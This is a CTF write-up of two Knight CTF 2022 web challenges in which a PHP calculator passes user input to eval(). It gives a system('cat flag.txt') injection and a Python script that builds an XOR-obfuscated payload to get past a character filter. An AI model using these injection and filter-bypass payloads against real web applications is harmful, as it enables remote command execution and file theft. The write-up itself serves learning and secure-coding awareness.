---
title: Knight CTF 2022 – Most Secure Calculator
date: '2022-01-21'
draft: false
authors: ['blueset']
tags: ['Knight CTF 2022', 'PHP', 'eval']
summary: 'Do not ever eval() user input, even you thought you have sanitized.'
---

## Most Secure Calculator 1 (50 points)

> Challenge Link: http://198.211.115.81:9003/  
> Flag Format: `KCTF{something_here}`  
> Note: Burte Force/Fuzzing not required and not allowed.  
> Author: NomanProdhan

Webpage has a form with a text box and a submit button. The form sends a POST request to `/`.

A comment is found in the HTML source of the webpage.

```html
<!-- 
    Hi Selina, 
    I learned about eval today and tomorrow I will learn about regex. I have build a calculator for your child.
    I have hidden some interesting things in flag.txt and I know you can read that file.
-->
```

* The webpage uses `eval` to “do calculations”.
* Flag is stored in `flag.txt`.

Submit `system("cat flag.txt");` to get the flag.

## Most Secure Calculator 2 (250 points)

> Challenge Link: http://198.211.115.81:9004/  
> Flag Format: `KCTF{something_here}`  
> Note: Burte Force/Fuzzing not required and not allowed.  
> Author: NomanProdhan  


Webpage has a form with a text box and a submit button. The form sends a POST request to `/`.

A comment is found in the HTML source of the webpage.

```
<!-- 
    Hi Selina, 
    I learned about regex today. I have upgraded the previous calculator. Now its the most secure calculator ever.
    The calculator accepts only numbers and symbols. 
    I have hidden some interesting things in flag.txt and I know you can create an interesting equation to read that file.
-->
```

Again,

* The webpage uses `eval` to “do calculations”.
* Filters are put in place to only accept “numbers and symbols”.
* Flag is stored in `flag.txt`.

Through trial and error, the following characters are found to be accepted:

```
!"#%'()*+,-./:;?@[\]^_`{|}~0123456789
```

Specifically, `$`, `<` and `>` are not accepted.

**Vulnerabilities:**

1. PHP allows to use a string literal as a function name.
2. PHP allows bit-wise XOR operation of strings.

Making use of feature 1, we can rewrite `system("cat flag.txt");` as `("system")("cat flag.txt");`.

Making use of feature 2, we can construct the words `system`, `cat`, `flag`, and `txt` using bit-wise XOR of 2 strings from the allowed character set.

For example, to construct the word `'sekai'`, we can have `'(%+!)' ^ '[@@@@'`.

```
(%+!)   00101000 00100101 00101011 00100001 00101001
     xor
[@@@@   01011011 01000000 01000000 01000000 01000000
      =
sekai   01110011 01100101 01101011 01100001 01101001
```

A Python script was written to find the XOR pairs and build the payload.

```py
chars = "!#%()*+,-./:;?@[]^_`{|}~&0123456789"
ascii_chars = "".join(chr(i) for i in range(32, 127))
diff = (set(ascii_chars) - set(chars))
mapping = {}

for i in chars:
    for j in chars:
        k = chr(ord(i) ^ ord(j))
        if k in diff and k not in mapping:
            mapping[k] = (i, j)

def transform(s):
    a = [mapping[c][0] for c in s]
    b = [mapping[c][1] for c in s]
    return "("+repr("".join(a)) + "^" + repr("".join(b))+")"

_system = transform("system")
_cat = transform("cat")
_flag = transform("flag")
_txt = transform("txt")

print(f"{_system}({_cat}.' '.{_flag}.'.'.{_txt});")
```

Submit this payload to get the flag.
